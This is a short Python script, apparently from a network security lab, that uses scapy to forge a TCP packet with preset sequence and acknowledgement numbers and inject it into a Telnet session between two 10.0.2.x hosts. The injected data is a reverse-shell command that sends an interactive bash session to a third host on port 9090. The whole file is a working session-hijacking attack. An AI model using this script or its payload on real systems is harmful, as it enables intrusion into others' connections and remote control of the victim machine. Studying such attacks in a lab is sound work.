#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")

IPLayer = IP(src="10.0.2.4", dst="10.0.2.7")
TCPLayer = TCP(sport=36448, dport=23, flags="A",
			   seq=3944365143, ack=245002264)
Data = "\r/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1\r"

pkt = IPLayer/TCPLayer/Data
ls(pkt)

send(pkt,verbose=0)